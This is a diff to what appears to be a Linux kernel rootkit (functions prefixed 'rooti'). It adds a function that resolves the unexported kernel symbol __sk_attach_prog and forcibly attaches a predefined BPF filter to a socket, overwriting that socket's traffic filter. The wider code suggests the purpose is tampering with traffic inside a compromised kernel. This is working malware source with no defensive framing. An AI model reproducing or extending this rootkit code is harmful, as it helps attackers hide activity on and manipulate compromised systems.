@@ -122,3 +122,29 @@ int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_
 
     return 0;
 }
+
+int rooti_overwrite_traffic_filter(struct sock *sock)
+{
+    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
+
+    struct sock_fprog_kern filter_program = {
+        .filter = ROOTI_BPF_FILTER_PROGRAM,
+        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
+    };
+    struct bpf_prog *bpf_program;
+    int err;
+
+    err = bpf_prog_create(&bpf_program, &filter_program);
+    if (bpf_program == NULL) {
+        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
+        return err;
+    }
+
+    err = ____sk_attach_prog(bpf_program, sock);
+    if (err) {
+        bpf_prog_destroy(bpf_program);
+        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
+        return err;
+    }
+    return 0;
+}
